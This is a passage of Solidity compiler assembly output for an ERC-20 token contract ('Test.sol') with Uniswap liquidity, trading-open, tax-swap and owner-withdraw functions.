\"#utility.yul\":1858:2042   */\n      jump\n        /* \"contracts/Test.sol\":12856:13146  function withdraw() external onlyOwner {... */\n    tag_9:\n      callvalue\n      dup1\n      iszero\n      tag_61\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_61:\n      pop\n      tag_62\n      tag_63\n      jump\t// in\n    tag_62:\n      stop\n        /* \"contracts/Test.sol\":4911:4939  address public uniswapV2Pair */\n    tag_10:\n      callvalue\n      dup1\n      iszero\n      tag_64\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_64:\n      pop\n      sload(0x14)\n      tag_65\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n    tag_65:\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":2211:2243   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":2193:2244   */\n      dup2\n      mstore\n        /* \"#utility.yul\":2181:2183   */\n      0x20\n        /* \"#utility.yul\":2166:2184   */\n      add\n        /* \"contracts/Test.sol\":4911:4939  address public uniswapV2Pair */\n      tag_32\n        /* \"#utility.yul\":2047:2250   */\n      jump\n        /* \"contracts/Test.sol\":6631:6748  function balanceOf(address account) public view override returns (uint256) {... */\n    tag_11:\n      callvalue\n      dup1\n      iszero\n      tag_69\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_69:\n      pop\n      tag_42\n      tag_71\n      calldatasize\n      0x04\n      tag_72\n      jump\t// in\n    tag_71:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      and\n        /* \"contracts/Test.sol\":6697:6704  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":6723:6732  _balances */\n      0x01\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Test.sol\":6631:6748  function balanceOf(address account) public view override returns (uint256) {... */\n      jump\n        /* \"contracts/Test.sol\":2668:2813  function renounceOwnership() public virtual onlyOwner {... */\n    tag_12:\n      callvalue\n      dup1\n      iszero\n      tag_75\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_75:\n      pop\n      tag_62\n      tag_77\n      jump\t// in\n        /* \"contracts/Test.sol\":4529:4587  uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals */\n    tag_13:\n      callvalue\n      dup1\n      iszero\n      tag_78\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_78:\n      pop\n      tag_42\n      sload(0x0f)\n      dup2\n      jump\n        /* \"contracts/Test.sol\":2463:2540  function owner() public view returns (address) {... */\n    tag_14:\n      callvalue\n      dup1\n      iszero\n      tag_82\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_82:\n      pop\n        /* \"contracts/Test.sol\":2501:2508  address */\n      0x00\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n        /* \"contracts/Test.sol\":2463:2540  function owner() public view returns (address) {... */\n      jump(tag_65)\n        /* \"contracts/Test.sol\":4593:4653  uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals */\n    tag_15:\n      callvalue\n      dup1\n      iszero\n      tag_86\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_86:\n      pop\n      tag_42\n      sload(0x10)\n      dup2\n      jump\n        /* \"contracts/Test.sol\":12746:12850  function getSenderEtherBalance() external view returns (uint) {... */\n    tag_17:\n      callvalue\n      dup1\n      iszero\n      tag_94\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_94:\n      pop\n        /* \"contracts/Test.sol\":12825:12835  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":12825:12843  msg.sender.balance */\n      balance\n        /* \"contracts/Test.sol\":12746:12850  function getSenderEtherBalance() external view returns (uint) {... */\n      jump(tag_42)\n        /* \"contracts/Test.sol\":6754:6940  function transfer(... */\n    tag_18:\n      callvalue\n      dup1\n      iszero\n      tag_98\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_98:\n      pop\n      tag_35\n      tag_100\n      calldatasize\n      0x04\n      tag_37\n      jump\t// in\n    tag_100:\n      tag_101\n      jump\t// in\n        /* \"contracts/Test.sol\":13152:13400  function manualSwap(uint256 amount) external {... */\n    tag_19:\n      callvalue\n      dup1\n      iszero\n      tag_103\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_103:\n      pop\n      tag_62\n      tag_105\n      calldatasize\n      0x04\n      tag_106\n      jump\t// in\n    tag_105:\n      tag_107\n      jump\t// in\n        /* \"contracts/Test.sol\":4735:4794  uint256 public _taxSwapThreshold = 20_000 * 10 ** _decimals */\n    tag_20:\n      callvalue\n      dup1\n      iszero\n      tag_108\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_108:\n      pop\n      tag_42\n      sload(0x11)\n      dup2\n      jump\n        /* \"contracts/Test.sol\":13406:13604  function openTrading() external onlyOwner {... */\n    tag_21:\n      callvalue\n      dup1\n      iszero\n      tag_112\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_112:\n      pop\n      tag_62\n      tag_114\n      jump\t// in\n        /* \"contracts/Test.sol\":6946:7109  function allowance(... */\n    tag_22:\n      callvalue\n      dup1\n      iszero\n      tag_115\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_115:\n      pop\n      tag_42\n      tag_117\n      calldatasize\n      0x04\n      tag_118\n      jump\t// in\n    tag_117:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":7075:7093  _allowances[owner] */\n      swap2\n      dup3\n      and\n        /* \"contracts/Test.sol\":7049:7056  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":7075:7093  _allowances[owner] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":7075:7086  _allowances */\n      0x02\n        /* \"contracts/Test.sol\":7075:7093  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"contracts/Test.sol\":7075:7102  _allowances[owner][spender] */\n      swap4\n      swap1\n      swap5\n      and\n      dup3\n      mstore\n      swap2\n      swap1\n      swap2\n      mstore\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Test.sol\":6946:7109  function allowance(... */\n      jump\n        /* \"contracts/Test.sol\":5995:6261  function addLiq() external payable onlyOwner {... */\n    tag_23:\n      tag_62\n      tag_122\n      jump\t// in\n        /* \"contracts/Test.sol\":7115:7295  function approve(... */\n    tag_38:\n        /* \"contracts/Test.sol\":7212:7216  bool */\n      0x00\n        /* \"contracts/Test.sol\":7228:7267  _approve(_msgSender(), spender, amount) */\n      tag_125\n        /* \"contracts/Test.sol\":177:187  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":7251:7258  spender */\n      dup5\n        /* \"contracts/Test.sol\":7260:7266  amount */\n      dup5\n        /* \"contracts/Test.sol\":7228:7236  _approve */\n      tag_128\n        /* \"contracts/Test.sol\":7228:7267  _approve(_msgSender(), spender, amount) */\n      jump\t// in\n    tag_125:\n      pop\n        /* \"contracts/Test.sol\":7284:7288  true */\n      0x01\n        /* \"contracts/Test.sol\":7115:7295  function approve(... */\n    tag_124:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":6532:6625  function totalSupply() public pure override returns (uint256) {... */\n    tag_48:\n        /* \"contracts/Test.sol\":6585:6592  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n      tag_130\n        /* \"contracts/Test.sol\":4345:4347  18 */\n      0x12\n        /* \"contracts/Test.sol\":4508:4510  10 */\n      0x0a\n        /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n      tag_131\n      jump\t// in\n    tag_130:\n        /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n      tag_132\n      swap1\n        /* \"contracts/Test.sol\":4492:4505  1_000_000_000 */\n      0x3b9aca00\n        /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n      tag_133\n      jump\t// in\n    tag_132:\n        /* \"contracts/Test.sol\":6604:6618  return _tTotal */\n      swap1\n      pop\n        /* \"contracts/Test.sol\":6532:6625  function totalSupply() public pure override returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Test.sol\":7301:7732  function transferFrom(... */\n    tag_54:\n        /* \"contracts/Test.sol\":7429:7433  bool */\n      0x00\n        /* \"contracts/Test.sol\":7445:7481  _transfer(sender, recipient, amount) */\n      tag_135\n        /* \"contracts/Test.sol\":7455:7461  sender */\n      dup5\n        /* \"contracts/Test.sol\":7463:7472  recipient */\n      dup5\n        /* \"contracts/Test.sol\":7474:7480  amount */\n      dup5\n        /* \"contracts/Test.sol\":7445:7454  _transfer */\n      tag_136\n        /* \"contracts/Test.sol\":7445:7481  _transfer(sender, recipient, amount) */\n      jump\t// in\n    tag_135:\n        /* \"contracts/Test.sol\":7491:7704  _approve(... */\n      tag_137\n        /* \"contracts/Test.sol\":7513:7519  sender */\n      dup5\n        /* \"contracts/Test.sol\":177:187  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":7559:7694  _allowances[sender][_msgSender()].sub(... */\n      tag_139\n        /* \"contracts/Test.sol\":7614:7620  amount */\n      dup6\n        /* \"contracts/Test.sol\":7559:7694  _allowances[sender][_msgSender()].sub(... */\n      mload(0x40)\n      dup1\n      0x60\n      add\n      0x40\n      mstore\n      dup1\n      0x28\n      dup2\n      mstore\n      0x20\n      add\n      data_974d1b4421da69cc60b481194f0dad36a5bb4e23da810da7a7fb30cdba178330\n      0x28\n      swap2\n      codecopy\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":7559:7578  _allowances[sender] */\n      dup11\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":7559:7570  _allowances */\n      0x02\n        /* \"contracts/Test.sol\":7559:7578  _allowances[sender] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"contracts/Test.sol\":177:187  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":7559:7592  _allowances[sender][_msgSender()] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n      swap2\n      swap1\n        /* \"contracts/Test.sol\":7559:7596  _allowances[sender][_msgSender()].sub */\n      tag_141\n        /* \"contracts/Test.sol\":7559:7694  _allowances[sender][_msgSender()].sub(... */\n      jump\t// in\n    tag_139:\n        /* \"contracts/Test.sol\":7491:7499  _approve */\n      tag_128\n        /* \"contracts/Test.sol\":7491:7704  _approve(... */\n      jump\t// in\n    tag_137:\n      pop\n        /* \"contracts/Test.sol\":7721:7725  true */\n      0x01\n        /* \"contracts/Test.sol\":7301:7732  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":12856:13146  function withdraw() external onlyOwner {... */\n    tag_63:\n        /* \"contracts/Test.sol\":2585:2591  _owner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x00))\n        /* \"contracts/Test.sol\":177:187  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":2585:2607  _owner == _msgSender() */\n      eq\n        /* \"contracts/Test.sol\":2577:2644  require(_owner == _msgSender(), \"Ownable: caller is not the owner\") */\n      tag_145\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_146\n      swap1\n      tag_147\n      jump\t// in\n    tag_146:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_145:\n        /* \"contracts/Test.sol\":12914:12925  tradingOpen */\n      sload(0x14)\n      shl(0xa0, 0x01)\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Test.sol\":12913:12925  !tradingOpen */\n      iszero\n        /* \"contracts/Test.sol\":12905:12961  require(!tradingOpen, \"Trading has already been opened\") */\n      tag_149\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":5330:5332   */\n      0x20\n        /* \"contracts/Test.sol\":12905:12961  require(!tradingOpen, \"Trading has already been opened\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5312:5333   */\n      mstore\n        /* \"#utility.yul\":5369:5371   */\n      0x1f\n        /* \"#utility.yul\":5349:5367   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5342:5372   */\n      mstore\n        /* \"#utility.yul\":5408:5441   */\n      0x54726164696e672068617320616c7265616479206265656e206f70656e656400\n        /* \"#utility.yul\":5388:5406   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5381:5442   */\n      mstore\n        /* \"#utility.yul\":5459:5477   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":12905:12961  require(!tradingOpen, \"Trading has already been opened\") */\n      tag_146\n        /* \"#utility.yul\":5128:5483   */\n      jump\n        /* \"contracts/Test.sol\":12905:12961  require(!tradingOpen, \"Trading has already been opened\") */\n    tag_149:\n        /* \"contracts/Test.sol\":12997:13018  address(this).balance */\n      selfbalance\n        /* \"contracts/Test.sol\":13036:13055  contractBalance > 0 */\n      dup1\n        /* \"contracts/Test.sol\":13028:13087  require(contractBalance > 0, \"Contract has no ETH balance\") */\n      tag_152\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":5690:5692   */\n      0x20\n        /* \"contracts/Test.sol\":13028:13087  require(contractBalance > 0, \"Contract has no ETH balance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5672:5693   */\n      mstore\n        /* \"#utility.yul\":5729:5731   */\n      0x1b\n        /* \"#utility.yul\":5709:5727   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5702:5732   */\n      mstore\n        /* \"#utility.yul\":5768:5797   */\n      0x436f6e747261637420686173206e6f204554482062616c616e63650000000000\n        /* \"#utility.yul\":5748:5766   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5741:5798   */\n      mstore\n        /* \"#utility.yul\":5815:5833   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":13028:13087  require(contractBalance > 0, \"Contract has no ETH balance\") */\n      tag_146\n        /* \"#utility.yul\":5488:5839   */\n      jump\n        /* \"contracts/Test.sol\":13028:13087  require(contractBalance > 0, \"Contract has no ETH balance\") */\n    tag_152:\n        /* \"contracts/Test.sol\":2501:2508  address */\n      0x00\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      dup1\n      sload\n        /* \"contracts/Test.sol\":13097:13139  payable(owner()).transfer(contractBalance) */\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"contracts/Test.sol\":13097:13139  payable(owner()).transfer(contractBalance) */\n      dup4\n      iszero\n      0x08fc\n      mul\n      swap2\n        /* \"contracts/Test.sol\":13123:13138  contractBalance */\n      dup5\n      swap2\n        /* \"contracts/Test.sol\":13097:13139  payable(owner()).transfer(contractBalance) */\n      dup2\n        /* \"contracts/Test.sol\":2501:2508  address */\n      dup2\n        /* \"contracts/Test.sol\":13097:13139  payable(owner()).transfer(contractBalance) */\n      dup2\n        /* \"contracts/Test.sol\":13123:13138  contractBalance */\n      dup6\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      dup9\n        /* \"contracts/Test.sol\":13097:13139  payable(owner()).transfer(contractBalance) */\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_157\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_157:\n      pop\n        /* \"contracts/Test.sol\":12895:13146  {... */\n      pop\n        /* \"contracts/Test.sol\":12856:13146  function withdraw() external onlyOwner {... */\n      jump\t// out\n        /* \"contracts/Test.sol\":2668:2813  function renounceOwnership() public virtual onlyOwner {... */\n    tag_77:\n        /* \"contracts/Test.sol\":2585:2591  _owner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x00))\n        /* \"contracts/Test.sol\":177:187  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":2585:2607  _owner == _msgSender() */\n      eq\n        /* \"contracts/Test.sol\":2577:2644  require(_owner == _msgSender(), \"Ownable: caller is not the owner\") */\n      tag_161\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_146\n      swap1\n      tag_147\n      jump\t// in\n    tag_161:\n        /* \"contracts/Test.sol\":2774:2775  0 */\n      0x00\n        /* \"contracts/Test.sol\":2758:2764  _owner */\n      dup1\n      sload\n        /* \"contracts/Test.sol\":2737:2777  OwnershipTransferred(_owner, address(0)) */\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":2758:2764  _owner */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"contracts/Test.sol\":2737:2777  OwnershipTransferred(_owner, address(0)) */\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      swap1\n        /* \"contracts/Test.sol\":2774:2775  0 */\n      dup4\n      swap1\n        /* \"contracts/Test.sol\":2737:2777  OwnershipTransferred(_owner, address(0)) */\n      log3\n        /* \"contracts/Test.sol\":2804:2805  0 */\n      0x00\n        /* \"contracts/Test.sol\":2787:2806  _owner = address(0) */\n      dup1\n      sload\n      not(sub(shl(0xa0, 0x01), 0x01))\n      and\n      swap1\n      sstore\n        /* \"contracts/Test.sol\":2668:2813  function renounceOwnership() public virtual onlyOwner {... */\n      jump\t// out\n        /* \"contracts/Test.sol\":6754:6940  function transfer(... */\n    tag_101:\n        /* \"contracts/Test.sol\":6854:6858  bool */\n      0x00\n        /* \"contracts/Test.sol\":6870:6912  _transfer(_msgSender(), recipient, amount) */\n      tag_125\n        /* \"contracts/Test.sol\":177:187  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":6894:6903  recipient */\n      dup5\n        /* \"contracts/Test.sol\":6905:6911  amount */\n      dup5\n        /* \"contracts/Test.sol\":6870:6879  _transfer */\n      tag_136\n        /* \"contracts/Test.sol\":6870:6912  _transfer(_msgSender(), recipient, amount) */\n      jump\t// in\n        /* \"contracts/Test.sol\":13152:13400  function manualSwap(uint256 amount) external {... */\n    tag_107:\n        /* \"contracts/Test.sol\":13231:13241  _taxWallet */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x05))\n        /* \"contracts/Test.sol\":177:187  msg.sender */\n      caller\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":13215:13241  _msgSender() == _taxWallet */\n      and\n      eq\n        /* \"contracts/Test.sol\":13207:13242  require(_msgSender() == _taxWallet) */\n      tag_172\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_172:\n        /* \"contracts/Test.sol\":13301:13305  this */\n      address\n        /* \"contracts/Test.sol\":6697:6704  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":6723:6732  _balances */\n      0x01\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"contracts/Test.sol\":13273:13279  amount */\n      dup2\n        /* \"contracts/Test.sol\":13273:13307  amount <= balanceOf(address(this)) */\n      gt\n      iszero\n        /* \"contracts/Test.sol\":13273:13321  amount <= balanceOf(address(this)) && amount > 0 */\n      dup1\n      iszero\n      tag_174\n      jumpi\n      pop\n        /* \"contracts/Test.sol\":13320:13321  0 */\n      0x00\n        /* \"contracts/Test.sol\":13311:13317  amount */\n      dup2\n        /* \"contracts/Test.sol\":13311:13321  amount > 0 */\n      gt\n        /* \"contracts/Test.sol\":13273:13321  amount <= balanceOf(address(this)) && amount > 0 */\n    tag_174:\n        /* \"contracts/Test.sol\":13252:13359  require(... */\n      tag_175\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":6046:6048   */\n      0x20\n        /* \"contracts/Test.sol\":13252:13359  require(... */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":6028:6049   */\n      mstore\n        /* \"#utility.yul\":6085:6087   */\n      0x0c\n        /* \"#utility.yul\":6065:6083   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":6058:6088   */\n      mstore\n      shl(0xa2, 0x15dc9bdb99c8185b5bdd5b9d)\n        /* \"#utility.yul\":6104:6122   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":6097:6139   */\n      mstore\n        /* \"#utility.yul\":6156:6174   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":13252:13359  require(... */\n      tag_146\n        /* \"#utility.yul\":5844:6180   */\n      jump\n        /* \"contracts/Test.sol\":13252:13359  require(... */\n    tag_175:\n        /* \"contracts/Test.sol\":13369:13393  swapTokensForEth(amount) */\n      tag_178\n        /* \"contracts/Test.sol\":13386:13392  amount */\n      dup2\n        /* \"contracts/Test.sol\":13369:13385  swapTokensForEth */\n      tag_179\n        /* \"contracts/Test.sol\":13369:13393  swapTokensForEth(amount) */\n      jump\t// in\n    tag_178:\n        /* \"contracts/Test.sol\":13152:13400  function manualSwap(uint256 amount) external {... */\n      pop\n      jump\t// out\n        /* \"contracts/Test.sol\":13406:13604  function openTrading() external onlyOwner {... */\n    tag_114:\n        /* \"contracts/Test.sol\":2585:2591  _owner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x00))\n        /* \"contracts/Test.sol\":177:187  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":2585:2607  _owner == _msgSender() */\n      eq\n        /* \"contracts/Test.sol\":2577:2644  require(_owner == _msgSender(), \"Ownable: caller is not the owner\") */\n      tag_182\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_146\n      swap1\n      tag_147\n      jump\t// in\n    tag_182:\n        /* \"contracts/Test.sol\":13467:13478  tradingOpen */\n      sload(0x14)\n      shl(0xa0, 0x01)\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Test.sol\":13466:13478  !tradingOpen */\n      iszero\n        /* \"contracts/Test.sol\":13458:13506  require(!tradingOpen, \"Trading is already open\") */\n      tag_185\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":6387:6389   */\n      0x20\n        /* \"contracts/Test.sol\":13458:13506  require(!tradingOpen, \"Trading is already open\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":6369:6390   */\n      mstore\n        /* \"#utility.yul\":6426:6428   */\n      0x17\n        /* \"#utility.yul\":6406:6424   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":6399:6429   */\n      mstore\n        /* \"#utility.yul\":6465:6490   */\n      0x54726164696e6720697320616c7265616479206f70656e000000000000000000\n        /* \"#utility.yul\":6445:6463   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":6438:6491   */\n      mstore\n        /* \"#utility.yul\":6508:6526   */\n      0x64\n      add\n        /* \"contracts/Test.sol\":13458:13506  require(!tradingOpen, \"Trading is already open\") */\n      tag_146\n        /* \"#utility.yul\":6185:6532   */\n      jump\n        /* \"contracts/Test.sol\":13458:13506  require(!tradingOpen, \"Trading is already open\") */\n    tag_185:\n        /* \"contracts/Test.sol\":13516:13527  swapEnabled */\n      0x14\n        /* \"contracts/Test.sol\":13516:13534  swapEnabled = true */\n      dup1\n      sload\n      not(shl(0xa0, 0xff00ff))\n        /* \"contracts/Test.sol\":13544:13562  tradingOpen = true */\n      and\n      shl(0xa0, 0x010001)\n      or\n      swap1\n      sstore\n        /* \"contracts/Test.sol\":13585:13597  block.number */\n      number\n        /* \"contracts/Test.sol\":13572:13582  firstBlock */\n      0x06\n        /* \"contracts/Test.sol\":13572:13597  firstBlock = block.number */\n      sstore\n        /* \"contracts/Test.sol\":13406:13604  function openTrading() external onlyOwner {... */\n      jump\t// out\n        /* \"contracts/Test.sol\":5995:6261  function addLiq() external payable onlyOwner {... */\n    tag_122:\n        /* \"contracts/Test.sol\":2585:2591  _owner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x00))\n        /* \"contracts/Test.sol\":177:187  msg.sender */\n      caller\n        /* \"contracts/Test.sol\":2585:2607  _owner == _msgSender() */\n      eq\n        /* \"contracts/Test.sol\":2577:2644  require(_owner == _msgSender(), \"Ownable: caller is not the owner\") */\n      tag_191\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_146\n      swap1\n      tag_147\n      jump\t// in\n    tag_191:\n        /* \"contracts/Test.sol\":6050:6065  uniswapV2Router */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x13))\n        /* \"contracts/Test.sol\":6050:6081  uniswapV2Router.addLiquidityETH */\n      0xf305d719\n        /* \"contracts/Test.sol\":6089:6098  msg.value */\n      callvalue\n        /* \"contracts/Test.sol\":6121:6125  this */\n      address\n        /* \"contracts/Test.sol\":6140:6164  balanceOf(address(this)) */\n      tag_194\n        /* \"contracts/Test.sol\":6121:6125  this */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      and\n        /* \"contracts/Test.sol\":6697:6704  uint256 */\n      0x00\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Test.sol\":6723:6732  _balances */\n      0x01\n        /* \"contracts/Test.sol\":6723:6741  _balances[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Test.sol\":6631:6748  function balanceOf(address account) public view override returns (uint256) {... */\n      jump\n        /* \"contracts/Test.sol\":6140:6164  balanceOf(address(this)) */\n    tag_194:\n        /* \"contracts/Test.sol\":6178:6179  0 */\n      0x00\n        /* \"contracts/Test.sol\":6193:6194  0 */\n      dup1\n        /* \"contracts/Test.sol\":6208:6215  owner() */\n      tag_195\n        /* \"contracts/Test.sol\":2501:2508  address */\n      0x00\n        /* \"contracts/Test.sol\":2527:2533  _owner */\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      swap1\n        /* \"contracts/Test.sol\":2463:2540  function owner() public view returns (address) {... */\n      jump\n        /* \"contracts/Test.sol\":6208:6215  owner() */\n    tag_195:\n        /* \"contracts/Test.sol\":6050:6254  uniswapV2Router.addLiquidityETH{value: msg.value}(... */\n      mload(0x40)\n      0xe0\n      dup9\n      swap1\n      shl\n      not(sub(shl(0xe0, 0x01), 0x01))\n      and\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":6896:6911   */\n      swap6\n      dup7\n      and\n        /* \"contracts/Test.sol\":6050:6254  uniswapV2Router.addLiquidityETH{value: msg.value}(... */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":6878:6912   */\n      mstore\n        /* \"#utility.yul\":6928:6946   */\n      0x24\n      dup2\n      add\n        /* \"#utility.yul\":6921:6955   */\n      swap5\n      swap1\n      swap5\n      mstore\n        /* \"#utility.yul\":6971:6989   */\n      0x44\n      dup5\n      add\n        /* \"#utility.yul\":6964:6998   */\n      swap3\n      swap1\n      swap3\n      mstore\n        /* \"#utility.yul\":7014:7032   */\n      0x64\n      dup4\n      add\n        /* \"#utility.yul\":7007:7041   */\n      mstore\n        /* \"#utility.yul\":7078:7093   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":7057:7076   */\n      0x84\n      dup3\n      add\n        /* \"#utility.yul\":7050:7094   */\n      mstore\n        /* \"contracts/Test.sol\":6229:6244  block.timestamp */\n      timestamp\n        /* \"#utility.yul\":7110:7129   */\n      0xa4\n      dup3\n      add\n        /* \"#utility.yul\":7103:7138   */\n      mstore\n        /* \"#utility.yul\":6812:6831   */\n      0xc4\n      add\n        /* \"contracts/Test.sol\":6050:6254  uniswapV2Router.addLiquidityETH{value: msg.value}(... */\n      0x60\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_199\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_199:\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_200\n      swap2\n      swap1\n      tag_201\n      jump\t// in\n    tag_200:\n      pop\n      pop\n      pop\n        /* \"contracts/Test.sol\":5995:6261  function addLiq() external payable onlyOwner {... */\n      jump\t// out\n        /* \"contracts/Test.sol\":7738:8068  function _approve(address owner, address spender, uint256 amount) private {... */\n    tag_128:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Test.sol\":7830:7849  owner != address(0) */\n      dup4\n      and\n        /* \"contracts/Test.sol\":7822:7890  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_204\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":7662:7664   */\n      0x20\n        /* \"contracts/Test.sol\":7822:7890  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      0x04\n      dup3\n      